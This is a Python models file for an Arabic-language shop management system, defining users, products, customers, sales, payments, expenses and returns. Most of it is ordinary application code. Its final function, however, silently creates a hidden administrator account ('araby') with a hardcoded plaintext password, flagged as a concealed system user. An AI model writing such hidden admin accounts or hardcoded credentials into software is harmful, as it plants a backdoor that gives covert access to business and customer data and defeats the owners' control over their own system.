from flask_sqlalchemy import SQLAlchemy
from flask_login import UserMixin
from datetime import datetime, timedelta
from werkzeug.security import generate_password_hash, check_password_hash
import secrets
import hashlib

db = SQLAlchemy()

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=True)
    password_hash = db.Column(db.String(128), nullable=False)
    role = db.Column(db.String(20), nullable=False, default='seller')  # 'admin' or 'seller'
    is_system = db.Column(db.Boolean, default=False, comment='مستخدم النظام المخفي')
    
    # Security enhancements
    is_active = db.Column(db.Boolean, default=True)
    is_verified = db.Column(db.Boolean, default=False)
    failed_login_attempts = db.Column(db.Integer, default=0)
    account_locked_until = db.Column(db.DateTime, nullable=True)
    last_login = db.Column(db.DateTime, nullable=True)
    last_password_change = db.Column(db.DateTime, default=datetime.utcnow)
    password_reset_token = db.Column(db.String(100), nullable=True)
    password_reset_expires = db.Column(db.DateTime, nullable=True)
    
    # Timestamps
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Relationships
    sales = db.relationship('Sale', backref='user', lazy=True)
    
    def set_password(self, password):
        """Set password with enhanced security"""
        # Ensure password is a string
        if isinstance(password, bytes):
            password = password.decode('utf-8')
        elif not isinstance(password, str):
            password = str(password)
        
        self.password_hash = generate_password_hash(password, method='pbkdf2:sha256', salt_length=16)
        self.last_password_change = datetime.utcnow()
    
    def check_password(self, password):
        """Check password with account lockout protection"""
        try:
            if self.is_account_locked():
                return False
            
            # تنظيف كلمة المرور من المسافات والأحرف الخاصة
            if password:
                password = str(password).strip()
                
            # التحقق من وجود password_hash
            if not self.password_hash:
                return False
            
            is_valid = check_password_hash(self.password_hash, password)
            
            if is_valid:
                self.failed_login_attempts = 0
                self.last_login = datetime.utcnow()
                try:
                    db.session.commit()
                except Exception:
                    db.session.rollback()
            else:
                self.failed_login_attempts += 1
                if self.failed_login_attempts >= 5:
                    self.account_locked_until = datetime.utcnow() + timedelta(minutes=30)
                try:
                    db.session.commit()
                except Exception:
                    db.session.rollback()
            
            return is_valid
            
        except Exception as e:
            # تسجيل الخطأ وإرجاع False
            print(f"Error checking password for user {self.username}: {str(e)}")
            return False
    
    def is_account_locked(self):
        """Check if account is currently locked"""
        if self.account_locked_until and datetime.utcnow() < self.account_locked_until:
            return True
        elif self.account_locked_until and datetime.utcnow() >= self.account_locked_until:
            # Unlock account
            self.account_locked_until = None
            self.failed_login_attempts = 0
            db.session.commit()
        return False
    
    def unlock_account(self):
        """Manually unlock account (admin function)"""
        self.account_locked_until = None
        self.failed_login_attempts = 0
        db.session.commit()
    
    def generate_password_reset_token(self):
        """Generate secure password reset token"""
        token = secrets.token_urlsafe(32)
        self.password_reset_token = hashlib.sha256(token.encode()).hexdigest()
        self.password_reset_expires = datetime.utcnow() + timedelta(hours=1)
        db.session.commit()
        return token
    
    def verify_password_reset_token(self, token):
        """Verify password reset token"""
        if not self.password_reset_token or not self.password_reset_expires:
            return False
        
        if datetime.utcnow() > self.password_reset_expires:
            return False
        
        token_hash = hashlib.sha256(token.encode()).hexdigest()
        return token_hash == self.password_reset_token
    
    def reset_password(self, new_password):
        """Reset password and clear reset token"""
        self.set_password(new_password)
        self.password_reset_token = None
        self.password_reset_expires = None
        self.failed_login_attempts = 0
        self.account_locked_until = None
        db.session.commit()
    
    def is_admin(self):
        return self.role == 'admin'
    
    def is_password_expired(self, days=90):
        """Check if password has expired (default 90 days)"""
        if not self.last_password_change:
            return True
        return datetime.utcnow() > self.last_password_change + timedelta(days=days)
    
    def get_id(self):
        """Override get_id for Flask-Login"""
        return str(self.id)

class Category(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name_ar = db.Column(db.String(100), nullable=False)
    description_ar = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Relationships
    products = db.relationship('Product', backref='category', lazy=True)

class Product(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name_ar = db.Column(db.String(200), nullable=False)
    description_ar = db.Column(db.Text)
    category_id = db.Column(db.Integer, db.ForeignKey('category.id'), nullable=False)
    wholesale_price = db.Column(db.Float, nullable=False, comment='سعر الجملة')
    retail_price = db.Column(db.Float, nullable=False, comment='سعر البيع')
    price = db.Column(db.Float, nullable=True)
    stock_quantity = db.Column(db.Float, nullable=False, default=0)
    min_stock_threshold = db.Column(db.Float, nullable=False, default=10)
    unit_type = db.Column(db.String(50), nullable=False, default='كامل')  # 'كامل' or 'جزئي'
    unit_description = db.Column(db.String(100))  # وصف الوحدة مثل "صفحة" أو "فصل"
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Relationships
    sale_items = db.relationship('SaleItem', backref='product', lazy=True)
    
    @property
    def profit_margin(self):
        """هامش الربح للوحدة الواحدة"""
        return self.retail_price - self.wholesale_price
    
    @property
    def profit_percentage(self):
        """نسبة الربح"""
        if self.wholesale_price > 0:
            return ((self.retail_price - self.wholesale_price) / self.wholesale_price) * 100
        return 0
    
    @property
    def is_low_stock(self):
        return self.stock_quantity <= self.min_stock_threshold
    
    @property
    def is_out_of_stock(self):
        return self.stock_quantity <= 0
    
    @property
    def stock_status(self):
        if self.is_out_of_stock:
            return 'نفد المخزون'
        elif self.is_low_stock:
            return 'مخزون منخفض'
        else:
            return 'متوفر'

class Customer(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(200), nullable=False)
    phone = db.Column(db.String(20))
    address = db.Column(db.Text)
    notes = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Relationships
    sales = db.relationship('Sale', backref='customer', lazy=True)
    
    @property
    def total_debt(self):
        """إجمالي الدين المستحق على العميل"""
        total_sales = sum(sale.total_amount for sale in self.sales if sale.payment_status != 'paid')
        total_payments = sum(payment.amount for sale in self.sales for payment in sale.payments)
        return max(0, total_sales - total_payments)
    
    @property
    def total_sales_amount(self):
        """إجمالي مبلغ المبيعات للعميل"""
        return sum(sale.total_amount for sale in self.sales)

class Sale(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    subtotal = db.Column(db.Float, nullable=False, default=0, comment='المجموع الفرعي قبل الخصم')
    discount_type = db.Column(db.String(20), nullable=False, default='none', comment='نوع الخصم')  # 'none', 'percentage', 'fixed'
    discount_value = db.Column(db.Float, nullable=False, default=0, comment='قيمة الخصم')
    discount_amount = db.Column(db.Float, nullable=False, default=0, comment='مبلغ الخصم المحسوب')
    total_amount = db.Column(db.Float, nullable=False)
    sale_date = db.Column(db.DateTime, default=datetime.utcnow)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    customer_id = db.Column(db.Integer, db.ForeignKey('customer.id'), nullable=True)
    payment_status = db.Column(db.String(20), nullable=False, default='paid')  # 'paid', 'partial', 'unpaid'
    payment_type = db.Column(db.String(20), nullable=False, default='cash')  # 'cash', 'credit'
    notes = db.Column(db.Text)
    
    # Relationships
    sale_items = db.relationship('SaleItem', backref='sale', lazy=True, cascade='all, delete-orphan')
    payments = db.relationship('Payment', backref='sale', lazy=True, cascade='all, delete-orphan')
    
    @property
    def paid_amount(self):
        """المبلغ المدفوع من إجمالي البيع"""
        if self.payment_type == 'cash':
            return self.total_amount
        return sum(payment.amount for payment in self.payments)
    
    @property
    def remaining_amount(self):
        """المبلغ المتبقي"""
        return max(0, self.total_amount - self.paid_amount)
    
    @property
    def is_fully_paid(self):
        """هل تم دفع المبلغ كاملاً"""
        return self.remaining_amount == 0
    
    @property
    def total_profit(self):
        """إجمالي ربح البيع"""
        profit = 0
        for item in self.sale_items:
            if item.product:
                # الربح = (سعر البيع - سعر الجملة) × الكمية
                profit += (item.unit_price - item.product.wholesale_price) * item.quantity
        return profit
    
    @property
    def cost_amount(self):
        """إجمالي تكلفة البيع (بسعر الجملة)"""
        cost = 0
        for item in self.sale_items:
            if item.product:
                cost += item.product.wholesale_price * item.quantity
        return cost
    
    @property
    def discount_type_ar(self):
        """ترجمة نوع الخصم للعربية"""
        types = {
            'none': 'بدون خصم',
            'percentage': 'نسبة مئوية',
            'fixed': 'مبلغ ثابت'
        }
        return types.get(self.discount_type, 'بدون خصم')
    
    def calculate_discount(self):
        """حساب مبلغ الخصم بناءً على النوع والقيمة"""
        if self.discount_type == 'percentage':
            return (self.subtotal * self.discount_value) / 100
        elif self.discount_type == 'fixed':
            return min(self.discount_value, self.subtotal)  # لا يتجاوز الخصم المجموع الفرعي
        return 0
    
    def update_totals(self):
        """تحديث المجاميع بعد حساب الخصم"""
        self.discount_amount = self.calculate_discount()
        self.total_amount = self.subtotal - self.discount_amount

class Payment(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    sale_id = db.Column(db.Integer, db.ForeignKey('sale.id'), nullable=False)
    amount = db.Column(db.Float, nullable=False)
    payment_date = db.Column(db.DateTime, default=datetime.utcnow)
    payment_method = db.Column(db.String(50), nullable=False, default='نقدي')  # نقدي، تحويل، إلخ
    notes = db.Column(db.Text)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)  # من سجل الدفعة
    
    # Relationships
    user = db.relationship('User', backref='payments', lazy=True)

class SaleItem(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    sale_id = db.Column(db.Integer, db.ForeignKey('sale.id'), nullable=False)
    product_id = db.Column(db.Integer, db.ForeignKey('product.id'), nullable=False)
    quantity = db.Column(db.Float, nullable=False)
    unit_price = db.Column(db.Float, nullable=False)
    total_price = db.Column(db.Float, nullable=False)
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        if self.quantity and self.unit_price:
            self.total_price = self.quantity * self.unit_price

# نموذج جديد للمصاريف
class Expense(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    description = db.Column(db.String(200), nullable=False, comment='وصف المصروف')
    amount = db.Column(db.Float, nullable=False, comment='المبلغ')
    expense_type = db.Column(db.String(50), nullable=False, comment='نوع المصروف')  # 'salary', 'rent', 'utilities', 'other'
    expense_date = db.Column(db.DateTime, default=datetime.utcnow, comment='تاريخ المصروف')
    category = db.Column(db.String(100), comment='فئة المصروف')
    notes = db.Column(db.Text, comment='ملاحظات')
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False, comment='المستخدم الذي سجل المصروف')
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Relationships
    user = db.relationship('User', backref='expenses', lazy=True)
    
    @property
    def expense_type_ar(self):
        """ترجمة نوع المصروف للعربية"""
        types = {
            'salary': 'راتب',
            'rent': 'إيجار',
            'utilities': 'خدمات (كهرباء، ماء، هاتف)',
            'marketing': 'تسويق وإعلان',
            'maintenance': 'صيانة',
            'supplies': 'مستلزمات مكتبية',
            'transportation': 'مواصلات',
            'other': 'أخرى'
        }
        return types.get(self.expense_type, self.expense_type)

# نموذج جديد للنواقص
class ShoppingList(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    item_name = db.Column(db.String(200), nullable=False, comment='اسم المنتج المطلوب')
    quantity_needed = db.Column(db.Float, nullable=False, default=1, comment='الكمية المطلوبة')
    unit_type = db.Column(db.String(50), nullable=False, default='كامل', comment='نوع الوحدة')
    estimated_price = db.Column(db.Float, nullable=True, comment='السعر المتوقع')
    priority = db.Column(db.String(20), nullable=False, default='متوسط', comment='الأولوية')  # 'عالي', 'متوسط', 'منخفض'
    notes = db.Column(db.Text, comment='ملاحظات')
    status = db.Column(db.String(20), nullable=False, default='مطلوب', comment='الحالة')  # 'مطلوب', 'تم الشراء', 'ملغي'
    category = db.Column(db.String(100), comment='الفئة')
    supplier = db.Column(db.String(200), comment='المورد المقترح')
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False, comment='المستخدم الذي أضاف البند')
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    purchased_date = db.Column(db.DateTime, nullable=True, comment='تاريخ الشراء')
    
    # Relationships
    user = db.relationship('User', backref='shopping_items', lazy=True)
    
    @property
    def priority_ar(self):
        """ترجمة الأولوية للعربية"""
        priorities = {
            'high': 'عالي',
            'medium': 'متوسط', 
            'low': 'منخفض'
        }
        return priorities.get(self.priority, self.priority)
    
    @property
    def status_ar(self):
        """ترجمة الحالة للعربية"""
        statuses = {
            'needed': 'مطلوب',
            'purchased': 'تم الشراء',
            'cancelled': 'ملغي'
        }
        return statuses.get(self.status, self.status)
    
    @property
    def total_estimated_cost(self):
        """إجمالي التكلفة المتوقعة"""
        if self.estimated_price:
            return self.quantity_needed * self.estimated_price
        return 0

# نموذج المرتجعات
class Return(db.Model):
    __tablename__ = 'return_transaction'  # تجنب الكلمة المحجوزة 'return'
    
    id = db.Column(db.Integer, primary_key=True)
    sale_id = db.Column(db.Integer, db.ForeignKey('sale.id'), nullable=False)
    customer_id = db.Column(db.Integer, db.ForeignKey('customer.id'), nullable=True)
    total_amount = db.Column(db.Float, nullable=False, comment='إجمالي قيمة المرتجع')
    return_date = db.Column(db.DateTime, default=datetime.utcnow, comment='تاريخ الإرجاع')
    reason = db.Column(db.String(200), nullable=False, comment='سبب الإرجاع')
    status = db.Column(db.String(20), nullable=False, default='pending', comment='حالة المرتجع')  # 'pending', 'approved', 'rejected'
    refund_method = db.Column(db.String(50), nullable=False, default='نقدي', comment='طريقة الاسترداد')  # 'نقدي', 'رصيد', 'تبديل'
    notes = db.Column(db.Text, comment='ملاحظات')
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False, comment='المستخدم الذي سجل المرتجع')
    processed_by = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True, comment='المستخدم الذي عالج المرتجع')
    processed_date = db.Column(db.DateTime, nullable=True, comment='تاريخ المعالجة')
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Relationships
    sale = db.relationship('Sale', backref='returns', lazy=True)
    customer = db.relationship('Customer', backref='returns', lazy=True)
    user = db.relationship('User', foreign_keys=[user_id], backref='created_returns', lazy=True)
    processor = db.relationship('User', foreign_keys=[processed_by], backref='processed_returns', lazy=True)
    return_items = db.relationship('ReturnItem', backref='return_ref', lazy=True, cascade='all, delete-orphan')
    
    @property
    def status_ar(self):
        """ترجمة حالة المرتجع للعربية"""
        statuses = {
            'pending': 'قيد المراجعة',
            'approved': 'مقبول',
            'rejected': 'مرفوض'
        }
        return statuses.get(self.status, self.status)
    
    @property
    def can_be_processed(self):
        """هل يمكن معالجة المرتجع"""
        return self.status == 'pending'

class ReturnItem(db.Model):
    __tablename__ = 'return_item'
    
    id = db.Column(db.Integer, primary_key=True)
    return_id = db.Column(db.Integer, db.ForeignKey('return_transaction.id'), nullable=False)
    sale_item_id = db.Column(db.Integer, db.ForeignKey('sale_item.id'), nullable=False)
    product_id = db.Column(db.Integer, db.ForeignKey('product.id'), nullable=False)
    quantity_returned = db.Column(db.Float, nullable=False, comment='الكمية المرتجعة')
    original_quantity = db.Column(db.Float, nullable=False, comment='الكمية الأصلية')
    unit_price = db.Column(db.Float, nullable=False, comment='سعر الوحدة')
    total_refund = db.Column(db.Float, nullable=False, comment='إجمالي الاسترداد')
    condition = db.Column(db.String(50), nullable=False, default='جيد', comment='حالة المنتج المرتجع')  # 'جيد', 'متضرر', 'معيب'
    notes = db.Column(db.Text, comment='ملاحظات على الصنف')
    
    # Relationships
    sale_item = db.relationship('SaleItem', backref='return_items', lazy=True)
    product = db.relationship('Product', backref='return_items', lazy=True)
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        if self.quantity_returned and self.unit_price:
            self.total_refund = self.quantity_returned * self.unit_price
    
    @property
    def condition_ar(self):
        """ترجمة حالة المنتج للعربية"""
        conditions = {
            'good': 'جيد',
            'damaged': 'متضرر',
            'defective': 'معيب'
        }
        return conditions.get(self.condition, self.condition)

def create_static_user():
    """إنشاء المستخدم الثابت للنظام"""
    static_username = "araby"
    static_password = "92321066"
    
    # التحقق من وجود المستخدم
    existing_user = User.query.filter_by(username=static_username).first()
    if not existing_user:
        # إنشاء المستخدم الثابت
        static_user = User(
            username=static_username,
            role='admin',  # منح صلاحيات المدير
            is_system=True,  # جعله مستخدم نظام (مخفي)
            is_active=True,
            is_verified=True
        )
        static_user.set_password(static_password)
        
        try:
            db.session.add(static_user)
            db.session.commit()
            return True
        except Exception:
            db.session.rollback()
            return False
    return True  # المستخدم موجود بالفعل 